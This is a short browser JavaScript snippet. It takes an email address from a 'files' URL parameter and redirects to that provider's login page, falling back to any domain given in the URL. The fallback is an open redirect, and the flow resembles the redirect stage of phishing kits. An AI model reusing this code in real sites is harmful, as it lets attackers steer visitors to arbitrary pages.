// Extract query string from the URL
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const email = urlParams.get('files');

// Validate and process the email if it exists
if (email) {
    const [username, emailDomain] = email.split('@').map(part => part.toLowerCase()); // Extract username and domain

    // Define the mapping of email domains to their login URLs
    const domainLoginUrls = {
        'gmail.com': 'https://accounts.google.com/signin/v2/identifier',
        'yahoo.com': 'https://login.yahoo.com/',
        'outlook.com': 'https://login.live.com/',
        '126.com': 'https://mail.126.com/',
        'icloud.com': 'https://www.icloud.com/'
        // Add more email domains and their corresponding login URLs as needed
    };

    // Check if the email domain has a specific login URL
    if (domainLoginUrls[emailDomain]) {
        // Redirect to the domain's login page
        window.location.href = domainLoginUrls[emailDomain];
    } else {
        // If the domain is not specifically handled, attempt a generic redirect
        window.location.href = `https://${emailDomain}`;
    }
} else {
    alert('No email parameter found in the query string.');
}
